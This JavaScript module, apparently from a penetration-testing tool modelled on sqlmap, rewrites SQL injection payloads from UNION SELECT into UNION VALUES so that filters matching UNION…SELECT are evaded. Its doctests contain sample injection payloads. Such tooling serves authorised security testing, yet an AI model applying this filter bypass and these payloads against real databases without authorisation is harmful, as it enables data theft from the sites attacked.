// 对标 sqlmap unionvalues.py（MariaDB/PostgreSQL/SQLite 等）：
// UNION SELECT <cols> 改写为标准 SQL 表值构造器 UNION VALUES (<cols>)
// 结果 payload 完全不含 SELECT 关键字（绕过 UNION.*SELECT 成对规则）
// 表值构造器无 FROM 子句 → 带 FROM 的 payload 保持原样
export const unionvalues = {
  name: 'unionvalues',
  description: 'UNION SELECT cols → UNION VALUES (cols)（消除 SELECT 关键字，MariaDB/PG/SQLite）',
  doctests: [
    { input: '-1 UNION ALL SELECT NULL,CONCAT(0x71,0x41),NULL-- -', output: '-1 UNION ALL VALUES (NULL,CONCAT(0x71,0x41),NULL)-- -' },
    { input: '-1 UNION SELECT 45,45#', output: '-1 UNION VALUES (45,45)#' },
    { input: '-1 UNION ALL SELECT NULL,NULL FROM DUAL-- -', output: '-1 UNION ALL SELECT NULL,NULL FROM DUAL-- -' }, // 带 FROM 不动
  ],
  /**
   * @param {string} payload
   * @returns {string}
   */
  transform(payload) {
    return String(payload ?? '').replace(
      /(UNION)(\s+ALL)?\s+SELECT\s+([\s\S]+?)(?=(?:--|#|\/\*)|$)/gi,
      (m, union, all, columns) => {
        const cols = columns.replace(/\s+$/, '');
        if (/\bFROM\b/i.test(cols)) return m;
        return `${union}${all || ''} VALUES (${cols})`;
      }
    );
  },
};
export default unionvalues;
